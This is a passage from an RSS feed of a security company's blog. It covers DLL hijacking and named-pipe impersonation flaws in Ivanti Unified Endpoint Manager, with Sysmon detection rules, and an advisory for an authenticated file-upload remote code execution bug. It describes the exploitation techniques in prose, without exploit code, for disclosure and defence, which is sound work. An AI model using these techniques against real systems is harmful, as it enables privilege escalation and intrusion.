&lt;p&gt;To exploit this vulnerability a local attacker needs to create a malicious DLL library and place it in a particular path on the filesystem. This path is entirely dependent on the host configuration; the vulnerable software relies on Windows&amp;rsquo; &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#search-order-for-desktop-applications&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DLL Search Order for desktop applications&lt;/a&gt;, reported below, for locating and loading a DLL file.&lt;/p&gt;
&lt;p&gt;With SafeDllSearchMode enabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;With SafeDllSearchMode disabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The directory from which the application loaded.&lt;/li&gt;
&lt;li&gt;The process&amp;rsquo; current directory.&lt;/li&gt;
&lt;li&gt;The system directory. This is usually C:\Windows\System32\ and/or C:\Windows\SysWow64\ depending on the OS and process architecture.&lt;/li&gt;
&lt;li&gt;The 16-bit system directory. This is usually C:\Windows\System\&lt;/li&gt;
&lt;li&gt;The Windows directory. This is usually C:\Windows&lt;/li&gt;
&lt;li&gt;The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SafeDllSearchMode is essentially a setting, enabled by default, which places the process&amp;rsquo; current directory later in the search order to try mitigate this type of vulnerabilities. Its value can be set to 1 (enabled) or 0 (disabled) in the following registry key:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In both circumstances the OS will look for a DLL file in the directories listed in the PATH environment variable, in the order as they appear, in case the library has not been not found yet. This variable needs particular attention, as it is easy to end up with directories writable by Everyone; moreover many software installers will silently append their directories to it.&lt;/p&gt;
&lt;p&gt;If a local attacker - or a remote one with an arbitrary filesystem write primitive - is able to place the malicious library in one of these paths, taking precedence over the path where the legitimate library is found - or regardless of precedence, if the legitimate library is not found at all - the file will be loaded by the vulnerable process, which will execute its DllMain function in its own context.&lt;/p&gt;
&lt;p&gt;Going back to the Ivanti Unified Endpoint Manager instance, the DLL files referenced in the advisory are not found by the processes, leaving the attacker a handful of possible paths to place his implant.&lt;/p&gt;
&lt;p&gt;To log exploitation attempts we can instruct Sysmon to record ImageLoad events; as the DLL file needs to have the precise filename the process is looking for, or else it will not be loaded, the filename is a good attribute to set filters on. Since legitimate libraries usually are signed by the software vendor or publisher, we can filter on this criteria to only log unsigned or untrusted images. The following rules will record library loading events on any process for all unsigned/untrusted libraries with these specific filenames, found anywhere in the filesystem:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13771&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Only log unsigned / invalid signature images --&amp;gt;
                &amp;lt;SignatureStatus condition=&amp;#34;is not&amp;#34;&amp;gt;Valid&amp;lt;/SignatureStatus&amp;gt;
                &amp;lt;!-- Only log these images --&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;wfapi.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;DMIAPI32.DLL&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;logonsrv.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;ldprofileui.dll&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;image&amp;#34;&amp;gt;OOBCredentials.dll&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_dll_hijacking_event-1024x593.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;DLL Hijacking event captured by Sysmon. The image will show up as unsigned if the certificate is not trusted.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;CVE-2020-13770 - Named pipe token impersonation&lt;/p&gt;
&lt;p&gt;This vulnerability is another classic in privilege escalation techniques; in fact, it is one of the methods meterpreter attempts when one runs &amp;ldquo;getsystem&amp;rdquo;. The issue takes place when a process opens a named pipe object without explicitly specifying proper security attributes. These security attributes can be specified when calling &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CreateFile&lt;/a&gt; on the &amp;ldquo;dwFlagsAndAttributes&amp;rdquo; parameter; among them, the following two are interesting from an attacker&amp;rsquo;s perspective:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SECURITY_DELEGATION - Impersonates a client at the Delegation impersonation level.&lt;/li&gt;
&lt;li&gt;SECURITY_IMPERSONATION - Impersonate a client at the impersonation level. This is the default behavior if no other flags are specified along with the SECURITY_SQOS_PRESENT flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first effectively allows for impersonation on remote hosts, while the second only allows that to happen locally. The problem relies on the fact that &amp;ldquo;SECURITY_IMPERSONATION&amp;rdquo; is the default value when no other attribute is specified, or when the &amp;ldquo;SECURITY_SQOS_PRESENT&amp;rdquo; flag is not set, which leads to this vulnerability being often introduced unwarily.&lt;/p&gt;
&lt;p&gt;Upon opening a named pipe with one of these two security attributes, the server has the access to obtain the client&amp;rsquo;s token and use it during subsequent access checks; in cases where the client has higher privileges than the server, the server would effectively obtain elevation of privileges. Any process can open a new named pipe object, granted that one with the same name does not already exist, although the impersonation process requires the server process to hold the SeImpersonatePrivilege privilege. By default this is assigned to service users, such as &amp;ldquo;nt authority\network service&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;A further requirement for the privilege escalation process is that the client must write some data to the named pipe before the impersonation process can take place. It is therefore possible for a process to open the pipe with insecure security attributes but not be exploitable to achieve EoP.&lt;/p&gt;
&lt;p&gt;With regards to detecting exploitation on Unified Endpoint Manager, having identified on which named pipe object the impersonation takes place, pipe creation events can be filtered on their name. Any process other than the legitimate pipe servers can be appended to the exclude rules to be filtered out. Since the pipe is specific to Ivanti software, such a configuration will be effective in giving no false positive. Further events can optionally be correlated to the one targeted here, such as process creations or file operation performed by the same process creating the named pipe object. Note that the exclude rule might need to be edited to the reader&amp;rsquo;s version of SQL Server.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13770&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Monitor CreatePipe events --&amp;gt;
                &amp;lt;EventType condition=&amp;#34;is&amp;#34;&amp;gt;CreatePipe&amp;lt;/EventType&amp;gt;
                &amp;lt;!-- Only log these named pipes --&amp;gt;
                &amp;lt;PipeName condition=&amp;#34;is&amp;#34;&amp;gt;\SQLLocal\ldmsdata&amp;lt;/PipeName&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;!-- Only log if the pipe is not created by these (legitimate) processes --&amp;gt;
                &amp;lt;Image condition=&amp;#34;is&amp;#34;&amp;gt;C:\Program Files\Microsoft SQL Server\MSSQL13.LDMSDATA\MSSQL\Binn\sqlservr.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_named_pipe-1024x609.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;CreatePipe event captured by Sysmon.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13774 - Ivanti Unified Endpoint Manager authenticated RCE via file upload</title>
      <link>//localhost:1313/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/</link>
      <pubDate>Thu, 12 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1; &amp;lt;= 2019.1.3&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13774&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 12/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 9.9 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Improper validation on file upload functionality present in Ivanti Unified Endpoint Manager&amp;rsquo;s web management console permits an authenticated user to upload .aspx files and execute them on the MS IIS server&amp;rsquo;s context. The issue is caused by insufficient file extension validation and insecure file operations on the uploaded image, which upon failure will leave the temporarily created files in an accessible location on the server.&lt;/p&gt;
&lt;p&gt;Solution&lt;/p&gt;
&lt;p&gt;The issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also communicated this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The &amp;ldquo;/LDMS/softwaredistribution/EditLaunchPadDialog.aspx&amp;rdquo; URL permits the upload of an image file on the server. Security controls on the file extension are implemented client-side and can thus be easily bypassed. By crafting a proper .ico image file containing ASP code and uploading it with .aspx extension, it is later possible to access and execute the malicious file on &amp;ldquo;/landesk/files/&lt;filename&gt;.aspx&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;The user must be authenticated and either part of &amp;ldquo;LANDesk Admnistrators&amp;rdquo; group or both part of &amp;ldquo;Landesk Management Suite&amp;rdquo; group and be assigned to the &amp;ldquo;Software Distribution&amp;rdquo; role in order to access the vulnerable component.&lt;/p&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
12/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
